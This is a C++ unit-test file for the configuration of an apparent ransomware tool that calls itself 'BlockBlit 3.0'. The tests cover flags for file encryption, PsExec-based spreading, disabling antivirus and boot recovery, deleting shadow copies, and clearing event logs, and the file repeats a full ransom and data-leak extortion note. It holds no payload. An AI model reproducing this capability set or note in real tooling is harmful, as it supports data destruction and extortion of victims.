#include "config.hpp"
#include <gtest/gtest.h>

TEST(ConfigTests, TestGetConfig) {
    Config cfg = GetConfig();
   
    EXPECT_FALSE(cfg.EncryptionEnabled());
    EXPECT_TRUE(cfg.EnumerationEnabled());
    EXPECT_TRUE(cfg.PropagationEnabled());
    EXPECT_FALSE(cfg.SelfDeleteEnabled());
    EXPECT_TRUE(cfg.DisableBootRecoveryEnabled());
    EXPECT_FALSE(cfg.DisableSecurityToolsEnabled());
    EXPECT_FALSE(cfg.EmptyRecycleBinEnabled());
    EXPECT_TRUE(cfg.SystemLangCheckEnabled());
    EXPECT_FALSE(cfg.MutexCheckEnabled());
    EXPECT_TRUE(cfg.ProcessTerminationEnabled());
    EXPECT_TRUE(cfg.ServiceTerminationEnabled());
    EXPECT_TRUE(cfg.WallpaperChangeEnabled());
    EXPECT_TRUE(cfg.IconChangeEnabled());
    EXPECT_FALSE(cfg.EventLogDeletionEnabled());
    EXPECT_TRUE(cfg.ShadowCopyDeletionEnabled());
    EXPECT_TRUE(cfg.GetHashedExcludedExtensions().empty());
    std::set<unsigned long> file_want = {0x0f702ff6, 0x0f702ff7, 0x0f702ff8}; // {L"file1", L"file2", L"file3"};
    std::set<unsigned long> dir_want = {0x7c95b2f5, 0x7c95b2f6}; // {L"dir1", L"dir2"};
    EXPECT_EQ(cfg.GetHashedExcludedFilenames(), file_want);
    EXPECT_EQ(cfg.GetHashedExcludedDirs(), dir_want);
    EXPECT_EQ(cfg.GetPsExecUsername(), L"dummyusername");
    EXPECT_EQ(cfg.GetPsExecPassword(), L"dummypassword");
    EXPECT_TRUE(cfg.GetStrictIncludeHosts().empty());
    EXPECT_TRUE(cfg.GetStrictIncludeRanges().empty());
}

TEST(ConfigTests, TestConfigConstructor) {
    Config cfg(R"(
    {
        "enable_enc": false,
        "enable_enum": false,
        "enable_prop": true,
        "excluded_filenames": [
            "file1",
            "file2",
            "file3"
        ],
        "excluded_dirs": [
            "dir1",
            "dir2"
        ],
        "excluded_ext": [
            ".ico",
            ".bin",
            ".EXE"
        ],
        "target_processes": [
            "proc1", "proc2", "proc3"
        ],
        "target_services": [
            "vss"
        ],
        "psexec_user": "dummyusername",
        "psexec_pass": "dummypassword",
        "strict_include_hosts": ["10.0.1.2", "10.0.1.3"],
        "strict_include_ranges": ["10.0.1.0/24"],
        "rsa_pub": ""
    }
    )");
   
    EXPECT_FALSE(cfg.EncryptionEnabled());
    EXPECT_FALSE(cfg.EnumerationEnabled());
    EXPECT_TRUE(cfg.PropagationEnabled());
    std::set<unsigned long> ext_want = {0x7c7814ce, 0x7c77f7cc, 0x7c780675};
    std::set<unsigned long> file_want = {0x0f702ff6, 0x0f702ff7, 0x0f702ff8};
    std::set<unsigned long> dir_want = {0x7c95b2f5, 0x7c95b2f6};
    std::set<unsigned long> proc_want = {0x102a20ea, 0x102a20eb, 0x102a20ec};
    std::vector<std::wstring> svc_want = {L"vss"};
    std::set<std::wstring> hosts_want = {L"10.0.1.2", L"10.0.1.3"};
    std::set<std::string> ranges_want = {"10.0.1.0/24"};
    EXPECT_EQ(cfg.GetHashedExcludedExtensions(), ext_want);
    EXPECT_EQ(cfg.GetHashedExcludedFilenames(), file_want);
    EXPECT_EQ(cfg.GetHashedExcludedDirs(), dir_want);
    EXPECT_EQ(cfg.GetHashedTargetProcesses(), proc_want);
    EXPECT_EQ(cfg.GetTargetServices(), svc_want);
    EXPECT_EQ(cfg.GetPsExecUsername(), L"dummyusername");
    EXPECT_EQ(cfg.GetPsExecPassword(), L"dummypassword");
    EXPECT_EQ(cfg.GetStrictIncludeHosts(), hosts_want);
    EXPECT_EQ(cfg.GetStrictIncludeRanges(), ranges_want);
}

TEST(ConfigTests, TestValidFilename) {
    Config cfg(R"(
    {
        "enable_enc": false,
        "enable_prop": true,
        "excluded_filenames": [
            "file1.txt",
            "file2.dat",
            "file3"
        ],
        "excluded_dirs": [
            "dir1",
            "dir2"
        ],
        "excluded_ext": [
            ".ico",
            ".bin",
            ".exe"
        ],
        "rsa_pub": ""
    }
    )");
    std::set<std::wstring> valid_files = {
        L"C:\\path\\file2.txt",
        L"C:\\path\\file1.txt.txt",
        L"C:\\path\\file4.txt",
        L"C:\\path\\path2\\file3.doc",
        L"file4.pdf"
    };
    std::set<std::wstring> invalid_files = {
        L"C:\\path\\file2.dat",
        L"C:\\path\\test.ico",
        L"C:\\path\\path2\\file3",
        L"test.exe",
        L"file1.txt",
        L"t.bin"
    };
    for (auto f: valid_files) {
        EXPECT_TRUE(cfg.IsValidTargetFile(f));
    }
    for (auto f: invalid_files) {
        EXPECT_FALSE(cfg.IsValidTargetFile(f));
    }
}

TEST(ConfigTests, TestValidDir) {
    Config cfg(R"(
    {
        "enable_enc": false,
        "enable_prop": true,
        "excluded_filenames": [
            "file1.txt",
            "file2.dat",
            "file3"
        ],
        "excluded_dirs": [
            "dir1",
            "dir2"
        ],
        "excluded_ext": [
            ".ico",
            ".bin",
            ".exe"
        ],
        "rsa_pub": ""
    }
    )");
    std::set<std::wstring> valid_dirs = {
        L"dir",
        L"dir3",
        L"dir4"
    };
    std::set<std::wstring> invalid_dirs = {
        L"dir1",
        L"dir2",
        L".",
        L".."
    };
    for (auto f: valid_dirs) {
        EXPECT_TRUE(cfg.IsValidTargetDir(f));
    }
    for (auto f: invalid_dirs) {
        EXPECT_FALSE(cfg.IsValidTargetDir(f));
    }
}

TEST(ConfigTests, TestAllFlagsEnabled) {
    Config cfg(R"(
    {
        "enable_enc": true,
        "enable_enum": true,
        "enable_prop": true,
        "enable_self_del": true,
        "disable_boot_recovery": true,
        "disable_av": true,
        "empty_recycle": true,
        "check_ui_lang": true,
        "check_mutex": true,
        "terminate_processes": true,
        "terminate_services": true,
        "change_wallpaper": true,
        "change_icon": true,
        "clear_evt_log": true,
        "delete_shadow": true,
        "excluded_filenames": [],
        "excluded_dirs": [],
        "excluded_ext": [],
        "target_processes": [],
        "target_services": [],
        "psexec_user": "dummyusername",
        "psexec_pass": "dummypassword",
        "extension": "sk12uyqzk",
        "strict_include_ranges": [],
        "strict_include_hosts": [],
        "note_contents": "~~~ BlockBlit 3.0 the world's fastest and most stable ransomware from 2019 ~~~\n>>>>> Your data has been stolen and encrypted.\nIf you don't pay the ransom, your data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.",
        "rsa_pub": ""
    }
    )");
    EXPECT_TRUE(cfg.EncryptionEnabled());
    EXPECT_TRUE(cfg.EnumerationEnabled());
    EXPECT_TRUE(cfg.PropagationEnabled());
    EXPECT_TRUE(cfg.SelfDeleteEnabled());
    EXPECT_TRUE(cfg.DisableBootRecoveryEnabled());
    EXPECT_TRUE(cfg.DisableSecurityToolsEnabled());
    EXPECT_TRUE(cfg.EmptyRecycleBinEnabled());
    EXPECT_TRUE(cfg.SystemLangCheckEnabled());
    EXPECT_TRUE(cfg.MutexCheckEnabled());
    EXPECT_TRUE(cfg.ProcessTerminationEnabled());
    EXPECT_TRUE(cfg.ServiceTerminationEnabled());
    EXPECT_TRUE(cfg.WallpaperChangeEnabled());
    EXPECT_TRUE(cfg.IconChangeEnabled());
    EXPECT_TRUE(cfg.EventLogDeletionEnabled());
    EXPECT_TRUE(cfg.ShadowCopyDeletionEnabled());
}

TEST(ConfigTests, TestAllFlagsDisabled) {
    Config cfg(R"(
    {
        "enable_enc": false,
        "enable_enum": false,
        "enable_prop": false,
        "enable_self_del": false,
        "disable_boot_recovery": false,
        "disable_av": false,
        "empty_recycle": false,
        "check_ui_lang": false,
        "check_mutex": false,
        "terminate_processes": false,
        "terminate_services": false,
        "change_wallpaper": false,
        "change_icon": false,
        "clear_evt_log": false,
        "delete_shadow": false,
        "excluded_filenames": [],
        "excluded_dirs": [],
        "excluded_ext": [],
        "target_processes": [],
        "target_services": [],
        "psexec_user": "dummyusername",
        "psexec_pass": "dummypassword",
        "extension": "sk12uyqzk",
        "strict_include_ranges": [],
        "strict_include_hosts": [],
        "note_contents": "~~~ BlockBlit 3.0 the world's fastest and most stable ransomware from 2019 ~~~\n>>>>> Your data has been stolen and encrypted.\nIf you don't pay the ransom, your data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.",
        "rsa_pub": ""
    }
    )");
    EXPECT_FALSE(cfg.EncryptionEnabled());
    EXPECT_FALSE(cfg.EnumerationEnabled());
    EXPECT_FALSE(cfg.PropagationEnabled());
    EXPECT_FALSE(cfg.SelfDeleteEnabled());
    EXPECT_FALSE(cfg.DisableBootRecoveryEnabled());
    EXPECT_FALSE(cfg.DisableSecurityToolsEnabled());
    EXPECT_FALSE(cfg.EmptyRecycleBinEnabled());
    EXPECT_FALSE(cfg.SystemLangCheckEnabled());
    EXPECT_FALSE(cfg.MutexCheckEnabled());
    EXPECT_FALSE(cfg.ProcessTerminationEnabled());
    EXPECT_FALSE(cfg.ServiceTerminationEnabled());
    EXPECT_FALSE(cfg.WallpaperChangeEnabled());
    EXPECT_FALSE(cfg.IconChangeEnabled());
    EXPECT_FALSE(cfg.EventLogDeletionEnabled());
    EXPECT_FALSE(cfg.ShadowCopyDeletionEnabled());
}

TEST(ConfigTests, TestAllFlagsDefault) {
    Config cfg(R"(
    {
        "psexec_user": "dummyusername",
        "psexec_pass": "dummypassword",
        "extension": "sk12uyqzk",
        "strict_include_ranges": [],
        "strict_include_hosts": [],
        "note_contents": "~~~ BlockBlit 3.0 the world's fastest and most stable ransomware from 2019 ~~~\n>>>>> Your data has been stolen and encrypted.\nIf you don't pay the ransom, your data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.",
        "rsa_pub": ""
    }
    )");
    EXPECT_FALSE(cfg.EncryptionEnabled());
    EXPECT_FALSE(cfg.EnumerationEnabled());
    EXPECT_FALSE(cfg.PropagationEnabled());
    EXPECT_FALSE(cfg.SelfDeleteEnabled());
    EXPECT_FALSE(cfg.DisableBootRecoveryEnabled());
    EXPECT_FALSE(cfg.DisableSecurityToolsEnabled());
    EXPECT_FALSE(cfg.EmptyRecycleBinEnabled());
    EXPECT_FALSE(cfg.SystemLangCheckEnabled());
    EXPECT_FALSE(cfg.MutexCheckEnabled());
    EXPECT_FALSE(cfg.ProcessTerminationEnabled());
    EXPECT_FALSE(cfg.ServiceTerminationEnabled());
    EXPECT_FALSE(cfg.WallpaperChangeEnabled());
    EXPECT_FALSE(cfg.IconChangeEnabled());
    EXPECT_FALSE(cfg.EventLogDeletionEnabled());
    EXPECT_FALSE(cfg.ShadowCopyDeletionEnabled());
}
